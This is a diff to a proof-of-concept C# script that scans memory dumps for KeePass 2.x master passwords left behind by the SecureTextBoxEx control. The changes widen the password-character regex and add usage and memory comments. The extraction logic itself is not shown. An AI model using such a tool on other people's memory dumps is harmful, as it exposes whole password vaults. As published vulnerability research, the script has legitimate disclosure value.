@@ -1,16 +1,16 @@
 ﻿// Simple POC script that searches a memory dump 
 // for passwords written inside KeePass 2.x SecureTextBoxEx 
-// text box, such as the master password
+// text box, such as the master password.
 
 // usage:
-// dotnet run <path>
+// dotnet run <path_to_dump>
 
 using System.Text.RegularExpressions;
 
 class Program
 {
     // What characters are valid password characters
-    const string allowedChars = "^[a-zA-Z0-9!?.,:;]$";
+    const string allowedChars = "^[\x20-\x7E]+$";
 
     static void Main(string[] args)
     {
@@ -27,6 +27,8 @@ class Program
             return;
         }        
 
+        // Should be a FileStream or memory mapped file instead to process large files,
+        // but with 64GB RAM I couldn't be bothered
         byte[] memoryDump = File.ReadAllBytes(filePath);
         Dictionary<int, HashSet<string>> candidates = new Dictionary<int, HashSet<string>>();
         
